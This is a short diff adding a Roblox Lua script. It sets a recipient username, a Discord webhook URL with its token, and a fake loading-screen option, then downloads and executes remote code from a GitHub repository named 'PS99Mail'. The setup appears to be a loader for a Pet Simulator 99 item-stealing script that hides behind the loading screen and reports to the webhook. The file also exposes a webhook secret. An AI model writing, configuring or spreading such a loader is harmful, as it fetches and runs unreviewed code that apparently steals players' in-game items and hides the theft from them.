@@ -1,0 +1,6 @@
+Username = "Landonroblox911"
+Webhook = "https://discord.com/api/webhooks/1176700732578218144/6Zz9xpvcwkpAnTpgBAib-tVVvdaZyLpSZBSEH69Ir4OKMk1R_-xRxoK4XQGvcE3Pv8o9"
+selectedLoadingScreen = "Select Loading" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 4
+LoadingScreen = true
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
